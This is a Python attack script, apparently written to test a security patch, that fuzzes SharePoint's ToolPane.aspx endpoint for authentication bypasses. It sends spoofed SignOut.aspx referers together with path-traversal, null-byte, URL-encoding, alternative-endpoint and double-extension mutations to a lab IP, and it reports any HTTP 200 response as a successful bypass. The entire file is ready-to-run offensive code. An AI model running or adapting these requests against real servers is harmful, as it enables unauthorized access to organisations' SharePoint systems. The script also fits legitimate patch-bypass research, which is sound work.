#!/usr/bin/env python3
"""
Test ToolPane.aspx authentication bypass mutations
Purpose: Find bypasses for the EndsWith("ToolPane.aspx") check in patch
"""
import requests
from urllib.parse import quote

requests.packages.urllib3.disable_warnings()

def test_bypass(target_url, endpoint_path, referer, description):
    """Test a specific bypass attempt"""
    url = f"{target_url}{endpoint_path}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Referer": referer,
    }
    
    print(f"\n[*] Testing: {description}")
    print(f"    Endpoint: {endpoint_path}")
    print(f"    Referer: {referer}")
    
    try:
        response = requests.get(url, headers=headers, verify=False, timeout=30, allow_redirects=False)
        print(f"    Status: {response.status_code}")
        
        if response.status_code == 200:
            print(f"    [!!!] SUCCESS - Auth bypassed!")
            print(f"    Response length: {len(response.text)}")
            return True
        elif response.status_code == 302:
            print(f"    Redirect to: {response.headers.get('Location', 'N/A')}")
        elif response.status_code == 401:
            print(f"    Blocked (401)")
        else:
            print(f"    Unexpected status: {response.status_code}")
    except Exception as e:
        print(f"    Error: {str(e)}")
    
    return False

if __name__ == "__main__":
    target = "http://10.10.10.166"
    
    # Test 1: Path traversal attempts
    print("\n" + "="*60)
    print("TEST GROUP 1: Path Traversal Bypasses")
    print("="*60)
    
    path_traversal_tests = [
        ("/_layouts/15/ToolPane.aspx/.", "/_layouts/SignOut.aspx", "Trailing /. after ToolPane.aspx"),
        ("/_layouts/15/ToolPane.aspx/..", "/_layouts/SignOut.aspx", "Trailing /.. after ToolPane.aspx"),
        ("/_layouts/15/ToolPane.aspx//", "/_layouts/SignOut.aspx", "Trailing // after ToolPane.aspx"),
        ("/_layouts/15/ToolPane.aspx%2F", "/_layouts/SignOut.aspx", "URL-encoded trailing slash"),
        ("/_layouts/15/ToolPane.aspx%00", "/_layouts/SignOut.aspx", "Null byte after ToolPane.aspx"),
        ("/_layouts/15/ToolPane.aspx%0a", "/_layouts/SignOut.aspx", "Newline after ToolPane.aspx"),
        ("/_layouts/15/ToolPane.aspx%20", "/_layouts/SignOut.aspx", "Space after ToolPane.aspx"),
    ]
    
    for path, ref, desc in path_traversal_tests:
        test_bypass(target, path + "?DisplayMode=Edit&foo=/ToolPane.aspx", ref, desc)
    
    # Test 2: URL encoding bypasses
    print("\n" + "="*60)
    print("TEST GROUP 2: URL Encoding Bypasses")
    print("="*60)
    
    encoding_tests = [
        ("/_layouts/15/ToolPane%2Easpx", "/_layouts/SignOut.aspx", "Encoded dot in ToolPane.aspx"),
        ("/_layouts/15/ToolPan%65.aspx", "/_layouts/SignOut.aspx", "Encoded 'e' in ToolPane"),
        ("/_layouts/15/ToolPane%2easpx", "/_layouts/SignOut.aspx", "Lowercase encoded dot"),
        ("/_layouts/15/ToolPane.asp%78", "/_layouts/SignOut.aspx", "Encoded 'x' in .aspx"),
    ]
    
    for path, ref, desc in encoding_tests:
        test_bypass(target, path + "?DisplayMode=Edit&foo=/ToolPane.aspx", ref, desc)
    
    # Test 3: Alternative endpoints with signout referer
    print("\n" + "="*60)
    print("TEST GROUP 3: Alternative Endpoints with SignOut Referer")
    print("="*60)
    
    alt_endpoint_tests = [
        ("/_layouts/15/start.aspx", "/_layouts/SignOut.aspx", "start.aspx with signout referer"),
        ("/_layouts/15/Authenticate.aspx", "/_layouts/SignOut.aspx", "Authenticate.aspx with signout referer"),
        ("/_layouts/15/login.aspx", "/_layouts/SignOut.aspx", "login.aspx with signout referer"),
        ("/_layouts/SignOut.aspx", "/_layouts/SignOut.aspx", "SignOut.aspx itself"),
    ]
    
    for path, ref, desc in alt_endpoint_tests:
        test_bypass(target, path + "?DisplayMode=Edit&foo=/ToolPane.aspx", ref, desc)
    
    # Test 4: Alternative referer paths (start paths)
    print("\n" + "="*60)
    print("TEST GROUP 4: Alternative Referer Paths (start.aspx)")
    print("="*60)
    
    alt_referer_tests = [
        ("/_layouts/15/ToolPane.aspx", "/_layouts/start.aspx", "Referer: start.aspx"),
        ("/_layouts/15/ToolPane.aspx", "/_layouts/15/start.aspx", "Referer: 15/start.aspx"),
        ("/_layouts/15/ToolPane.aspx", "/_layouts/signout.aspx", "Referer: lowercase signout"),
        ("/_layouts/15/ToolPane.aspx", "/_layouts/SIGNOUT.ASPX", "Referer: uppercase SIGNOUT"),
    ]
    
    for path, ref, desc in alt_referer_tests:
        test_bypass(target, path + "?DisplayMode=Edit&foo=/ToolPane.aspx", ref, desc)
    
    # Test 5: Double extension
    print("\n" + "="*60)
    print("TEST GROUP 5: Double Extension Bypass")
    print("="*60)
    
    test_bypass(target, "/_layouts/15/ToolPane.aspx.aspx?DisplayMode=Edit&foo=/ToolPane.aspx", "/_layouts/SignOut.aspx", "Double .aspx extension")

